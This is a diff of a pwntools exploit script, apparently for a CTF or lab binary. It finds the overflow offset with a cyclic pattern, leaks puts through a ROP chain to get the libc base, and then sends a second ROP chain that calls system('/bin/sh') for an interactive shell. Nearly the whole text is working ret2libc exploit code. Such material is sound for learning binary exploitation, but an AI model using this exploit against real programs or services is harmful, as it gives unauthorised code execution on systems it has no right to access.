@@ -8,11 +8,12 @@ from pwn import *
 LOCAL = True
 REMOTETTCP = False
 REMOTESSH = False
-GDB = True
+GDB = False
 
-LOCAL_BIN = "./test/ret"
+LOCAL_BIN = "./ret"
 REMOTE_BIN = "~/vuln" #For ssh
-LIBC = "" #ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it
+LIBC = "./libc6_2.31-0ubuntu9.2_amd64.so" #ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it
+context.arch = 'amd64'
 
 if LOCAL:
     pty = process.PTY
@@ -53,12 +54,11 @@ b *0x0000000000401185
 OFFSET = b"" # if known, should be set
 if OFFSET == b"":
 	log.info("Searching for offset")
-	p.sendline(cyclic(256,n=8))
+	p.sendline(cyclic(516,n=8))
 	p.wait()
 	core = Coredump('./core')
-	myoffset = cyclic_find(core.read(core.rsp,8),n=8)
-	log.info(f"Offset is {myoffset}")
-	OFFSET = b"A"*myoffset
+	OFFSET = cyclic_find(core.read(core.rsp,8),n=8)
+	log.info(f"Offset is {OFFSET}")
 
 #####################
 #### Find Gadgets ###
@@ -96,49 +96,59 @@ def generate_payload_aligned(rop):
             log.warning(f"I couldn't align the payload! Len: {len(payload1)}")
             return payload1
 
-def get_addr(libc_func,p):
-    FUNC_GOT = ELF_LOADED.got[libc_func]
-    log.info(libc_func + " GOT @ " + hex(FUNC_GOT))
-    # Create rop chain
-    rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
-    log.info("Aligning payload")
-    rop1 = generate_payload_aligned(rop1)
+def get_addr():
+    print(p.recv())
+    rop1 = ROP(ELF_LOADED)
+    rop1.call(ELF_LOADED.symbols["puts"], [ELF_LOADED.got['puts']])
+    rop1.call(ELF_LOADED.symbols["main"])
 
-    # Send our rop-chain payload
-    log.info(f"Going to use the following payload:\n{rop1}")
-    p.sendline(rop1)
-    pause(10)
-    # If binary is echoing back the payload, remove that message
-    print(p.recvline())
-    print(p.recvline())
-    received = p.recvline().strip()
-    if OFFSET[:30] in received:
-    	recieved = p.recvline().strip()
-    
-    # Parse leaked address
-    log.info(f"Length rop1: {len(rop1)}")
-    leak = u64(received.ljust(8, b"\x00"))
-    log.info(f"Leaked LIBC address, {libc_func}: {hex(leak)}")
-    
-    # Set lib base address
+    payload1 = [
+        b"A"*OFFSET,
+        rop1.chain()
+    ]
+
+    payload1 = b"".join(payload1)
+    p.sendline(payload1)
+    print(p.recv())
+    puts = u64(p.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
+    log.info(f"Puts found at {hex(puts)}")
+    libc = ELF(LIBC)
+
     if LIBC:
-        LIBC.address = leak - LIBC.symbols[libc_func] #Save LIBC base
-        log.info("LIBC base @ %s" % hex(LIBC.address))
+        libc.address = puts - libc.symbols['puts'] #Save LIBC base
+        log.info("LIBC base @ %s" % hex(libc.address))
 
-    # If not LIBC yet, stop here
+        # If not LIBC yet, stop here
     else:
         log.warning("TO CONTINUE: Find the LIBC library and continue with the exploit... (https://LIBC.blukat.me/)")
         p.interactive()
         exit()
-    
-    return hex(leak)
 
-get_addr(libc_func,p) #Search for puts address in memory to obtain LIBC base
+    return libc 
+
+libc = get_addr() #Search for puts address in memory to obtain LIBC base
 
 ##############################
 ##### FINAL EXPLOITATION #####
 ##############################
 
+rop2 = ROP(libc)
+rop2.call("puts", [ next(libc.search(b"/bin/sh\x00")) ])
+rop2.call("system", [ next(libc.search(b"/bin/sh\x00")) ])
+rop2.call("exit")
+
+payload2 = [
+    b"A"*OFFSET,
+    rop2.chain()
+]
+
+payload2 = b"".join(payload2)
+
+p.sendline(payload2)
+
+p.interactive()
+
+"""
 BINSH = next(LIBC.search(b"/bin/sh"))  #Verify with find /bin/sh
 SYSTEM = LIBC.sym["system"]
 EXIT = LIBC.sym["exit"]
@@ -154,4 +164,6 @@ rop2 = generate_payload_aligned(rop2)
 p.clean()
 p.sendline(rop2)
 
-p.interactive() 
+p.interactive()
+
+"""
